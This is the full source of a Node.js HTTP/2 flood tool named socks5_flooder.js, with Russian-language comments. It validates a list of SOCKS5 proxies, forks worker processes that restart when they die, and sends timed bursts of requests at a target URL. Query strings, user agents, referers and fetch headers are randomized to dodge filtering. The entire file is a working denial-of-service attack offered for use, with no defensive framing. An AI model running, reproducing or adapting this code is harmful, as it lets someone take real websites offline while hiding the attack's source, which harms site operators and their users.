const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const { SocksClient } = require("socks");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7){
    console.log(`Использование: node socks5_flooder.js <target> <time> <rate> <threads> <proxyfile>`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().replace(/\r/g, '').split(/\n/).filter(Boolean);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

let proxies = readLines(args.proxyFile);
let validProxies = []; // Только рабочие прокси
let checkingInProgress = false;

const parsedTarget = url.parse(args.target);

// Функция проверки одного прокси
function checkProxy(proxy) {
    return new Promise((resolve) => {
        const proxyParts = proxy.replace('socks5://', '').split(':');
        if (proxyParts.length < 2) return resolve(false);

        const socksOptions = {
            proxy: {
                host: proxyParts[0],
                port: parseInt(proxyParts[1]),
                type: 5
            },
            command: 'connect',
            destination: {
                host: 'www.google.com',
                port: 443
            },
            timeout: 6000
        };

        SocksClient.createConnection(socksOptions, (err, info) => {
            if (err || !info?.socket) {
                return resolve(false);
            }
            info.socket.destroy();
            resolve(true);
        });
    });
}

// Массовое тестирование прокси
async function validateProxies() {
    if (checkingInProgress) return;
    checkingInProgress = true;

    console.log(`[Proxy Checker] Проверка ${proxies.length} прокси...`);

    const batchSize = 50;
    validProxies = [];

    for (let i = 0; i < proxies.length; i += batchSize) {
        const batch = proxies.slice(i, i + batchSize);
        const results = await Promise.all(batch.map(checkProxy));

        for (let j = 0; j < batch.length; j++) {
            if (results[j]) {
                validProxies.push(batch[j]);
            }
        }
        await new Promise(r => setTimeout(r, 200));
    }

    console.log(`[Proxy Checker] Готово! Рабочих: ${validProxies.length}/${proxies.length}`);
    if (validProxies.length === 0) {
        console.log("[ERROR] Нет рабочих прокси. Выход.");
        process.exit(1);
    }

    checkingInProgress = false;
}

// Периодическая перепроверка (если рабочих стало мало)
setInterval(async () => {
    if (!checkingInProgress && validProxies.length < Math.max(10, proxies.length * 0.2)) {
        console.log("[Proxy Checker] Мало рабочих прокси. Перепроверка всего списка...");
        proxies = readLines(args.proxyFile); // Перечитываем файл
        await validateProxies();
    }
}, 60000);

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];

const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "es-ES,es;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8"
];

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0"
];

const referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/",
    "https://www.baidu.com/",
    ""
];

class NetSocket {
    constructor(){}

    SOCKS5(options, callback) {
        const proxyParts = options.proxy.replace('socks5://', '').split(':');
        const socksOptions = {
            proxy: {
                host: proxyParts[0],
                port: parseInt(proxyParts[1]),
                type: 5
            },
            command: 'connect',
            destination: {
                host: options.address.split(':')[0],
                port: 443
            },
            timeout: options.timeout || 8000
        };

        SocksClient.createConnection(socksOptions, (err, info) => {
            if (err) {
                return callback(undefined, "error: " + err);
            }
            const connection = info.socket;
            connection.setKeepAlive(true, 60000);
            return callback(connection, undefined);
        });
    }
}

const Header = new NetSocket();

function buildHeaders() {
    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
    const rand_path = (parsedTarget.path || "/") + rand_query;

    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": rand_path,
        "user-agent": randomElement(useragents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-dest": randomElement(fetch_dest),
        "sec-fetch-mode": randomElement(fetch_mode),
        "upgrade-insecure-requests": "1"
    };

    const ref = randomElement(referers);
    if (ref) headers["referer"] = ref;

    if (Math.random() > 0.5) {
        headers["dnt"] = "1";
    }

    return headers;
}

function runFlooder() {
    if (validProxies.length === 0) return;

    const proxyAddr = randomElement(validProxies);
    if (!proxyAddr || !proxyAddr.includes(":")) return;

    const proxyOptions = {
        proxy: proxyAddr,
        address: parsedTarget.host + ":443",
        timeout: 8000
    };

    Header.SOCKS5(proxyOptions, (connection, error) => {
        if (error || !connection) {
            const index = validProxies.indexOf(proxyAddr);
            if (index !== -1) {
                validProxies.splice(index, 1);
                console.log(`[Flooder] Прокси ${proxyAddr} мёртв → удалён. Осталось: ${validProxies.length}`);
            }
            return;
        }

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            rejectUnauthorized: false,
            socket: connection,
            servername: parsedTarget.host,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                maxConcurrentStreams: 30,
                initialWindowSize: 65535,
                enablePush: false,
            },
            maxSessionMemory: 32000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        let IntervalAttack = null;

        client.on("connect", () => {
            IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const headers = buildHeaders();
                    const request = client.request(headers);

                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });

                    request.on("error", () => {
                        request.destroy();
                    });

                    request.end();
                }
            }, 1000);
        });

        const cleanup = () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        };

        client.on("close", cleanup);
        client.on("error", () => {
            const idx = validProxies.indexOf(proxyAddr);
            if (idx !== -1) {
                validProxies.splice(idx, 1);
                console.log(`[Flooder] Ошибка сессии → прокси ${proxyAddr} удалён. Осталось: ${validProxies.length}`);
            }
            cleanup();
        });

        tlsConn.on("error", cleanup);
        tlsConn.on("end", cleanup);
    });
}

// Мастер-процесс
if (cluster.isMaster) {
    validateProxies().then(() => {
        console.log(`[Master] Запуск ${args.threads} потоков...`);
        for (let counter = 1; counter <= args.threads; counter++) {
            cluster.fork();
        }

        cluster.on('exit', (worker) => {
            console.log(`[Master] Поток ${worker.process.pid} умер. Запускаю новый...`);
            cluster.fork();
        });
    });
} else {
    setInterval(runFlooder, 1); // Чуть реже, чтобы не перегружать
}

const KillScript = () => {
    console.log("[Flooder] Атака завершена по таймеру.");
    process.exit(1);
};
setTimeout(KillScript, args.time * 1000);
